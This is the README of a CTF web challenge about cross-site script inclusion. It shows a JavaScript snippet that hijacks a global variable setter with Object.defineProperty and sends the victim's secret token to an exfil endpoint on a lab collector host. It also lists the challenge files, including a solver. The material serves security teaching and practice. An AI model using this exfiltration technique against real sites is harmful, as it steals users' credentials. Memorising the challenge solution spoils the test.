# xssi-easy (150 pts)

## Vulnerability: Cross-Site Script Inclusion (Global Variable Assignment)

### Description
The victim web service generates an authenticated JavaScript resource at `http://victim.ctf:3000/api/profile.js`:
```javascript
var userRole = "administrator";
var secretToken = "sec_...";
```
Because the script does not validate `Sec-Fetch-Dest` or restrict cross-origin execution, an attacker page on `http://attacker.ctf:8080` can include it via `<script src="http://victim.ctf:3000/api/profile.js">`.

Before the script executes, the attacker's page intercepts the top-level declaration using `Object.defineProperty`:
```javascript
const jobId = new URLSearchParams(window.location.search).get('jobId');
Object.defineProperty(window, 'secretToken', {
  set: function(val) {
    fetch('http://portal.ctf:8000/exfil?jobId=' + encodeURIComponent(jobId) + '&secret=' + encodeURIComponent(val));
  }
});
```
When the victim script assigns `secretToken`, the setter runs, exfiltrating the victim's secret to the verification collector and awarding the flag.

## Files
- `server.js`: Hosts victim app (port 3000) and bot portal (port 8000).
- `bot.js`: Puppeteer headless bot that logs in as the victim and visits the player's sandboxed exploit.
- `public/`: HTML web interface for direct browser interaction.
- `Dockerfile` & `docker-compose.yml`: Container configuration.
- `challenge.yml`: CTFd configuration.
- `solve.py`: Automated solver and test verification harness.

## Running Locally
```bash
npm install
npm start
python solve.py
```
